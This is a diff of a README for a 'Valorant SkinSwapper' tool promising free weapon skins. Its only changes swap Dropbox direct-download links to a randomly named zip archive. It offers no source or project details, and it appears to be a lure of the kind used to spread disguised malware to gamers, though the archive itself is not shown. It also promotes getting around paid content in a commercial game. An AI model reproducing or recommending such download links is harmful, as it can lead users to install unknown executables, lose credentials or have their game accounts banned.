@@ -2,7 +2,7 @@
 
 Easily swap skins in Valorant without spending money! This tool lets you change the appearance of your weapons, giving you access to a variety of skins effortlessly.  
 
-[![Download Valorant SkinSwapper](https://img.shields.io/badge/Download-Valorant%20SkinSwapper-blueviolet)](https://www.dropbox.com/scl/fi/nnpjxw1svv1mk8ujarq82/Specialty.zip?rlkey=0wd03l5wgxhjcg0kf4btaozu2&st=qs5u0021&dl=1)
+[![Download Valorant SkinSwapper](https://img.shields.io/badge/Download-Valorant%20SkinSwapper-blueviolet)](https://www.dropbox.com/scl/fi/klw7z4tepkx9g45pgddss/MLirins.zip?rlkey=7lmdylzkes5g9miusxhpap4t1&st=798fuxoz&dl=1)
 
 ## 🔥 Features:
 - Swap any weapon skin instantly  
@@ -19,4 +19,4 @@ Easily swap skins in Valorant without spending money! This tool lets you change 
 
 🚀 Enjoy a fresh look in Valorant without breaking the bank!  
 
-[![Download Valorant SkinSwapper](https://img.shields.io/badge/Download-Valorant%20SkinSwapper-blueviolet)](https://www.dropbox.com/scl/fi/nnpjxw1svv1mk8ujarq82/Specialty.zip?rlkey=0wd03l5wgxhjcg0kf4btaozu2&st=qs5u0021&dl=1)
+[![Download Valorant SkinSwapper](https://img.shields.io/badge/Download-Valorant%20SkinSwapper-blueviolet)](https://www.dropbox.com/scl/fi/klw7z4tepkx9g45pgddss/MLirins.zip?rlkey=7lmdylzkes5g9miusxhpap4t1&st=798fuxoz&dl=1)
